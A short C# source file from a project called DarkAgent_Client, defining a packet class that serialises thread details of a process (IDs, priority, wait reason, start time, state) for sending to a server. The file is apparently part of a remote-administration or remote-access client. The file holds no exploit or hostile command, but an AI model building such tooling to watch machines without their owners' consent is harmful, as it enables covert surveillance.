using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_GetProcessThreads : SendBasePacket
    {
        ProcessThreadInfo inf;
        public S_GetProcessThreads(ClientConnect client, ProcessThreadInfo info)
            : base(client)
        {
            inf = info;
        }

        protected internal override void Write()
        {
            WriteByte(3);
            WriteInteger(inf.PID);
            WriteInteger(inf.ID);
            WriteByte(inf.Pritioity);
            WriteString(inf.WaitReason);
            WriteByte(inf.PriorityBoost);
            WriteString(inf.PrivilegedProcessorTime);
            WriteString(inf.StartTime);
            WriteString(inf.Threadstate);
        }
    }
}
